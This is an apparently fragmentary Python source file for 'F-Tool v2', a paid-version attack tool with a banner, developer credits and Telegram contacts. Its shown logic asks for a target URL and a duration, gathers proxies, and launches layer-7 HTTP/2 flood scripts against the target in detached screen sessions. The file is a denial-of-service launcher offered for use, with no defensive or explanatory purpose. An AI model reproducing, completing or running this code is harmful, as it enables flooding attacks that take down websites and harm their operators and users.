...
#		self.styleText("\n [*] Downloading Proxy...\n")
	...
	def home(self): # don't edit this banner lol
		print(f"""
                        {Color.LG}╔══════════════════════╗
    \033[38;5;129m╔═╗{Color.LB} ╔╦╗╔═╗╔═╗╦      {Color.LG}║ {Color.LR}Created: {Color.LY}5/3/22      {Color.LG}║
    \033[38;5;129m╠╣{Color.LB}{Color.LR}───{Color.LB}║ ║ ║║ ║║      {Color.LG}║ {Color.LR}Updated: {Color.LY}8/29/22     {Color.LG}║
    \033[38;5;129m╚{Color.LB}    ╩ ╚═╝╚═╝╩═╝{Color.LG}v2  {Color.LG}║ {Color.LB}\033[38;5;129mPaid Version         {Color.LG}║
                        {Color.LG}╚══════════════════════╝
    {Color.LR}[{Color.LG}>    Developed By FDc0d3 & Aya{Color.LG}    <{Color.LR}]""")
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/http2 {url} {floodtime}'], shell=True);subprocess.run([f'screen -dm node utils/L7/Thttp2 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
...
{Color.LG}DEV{Color.LR} -> {Color.LB}ContactDev"""
	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}\n  Owner{Color.LR}:{Color.LY}  @FDc0d3\n  AdminAya{Color.LR}:{Color.LY}  @Ms_Yor"""
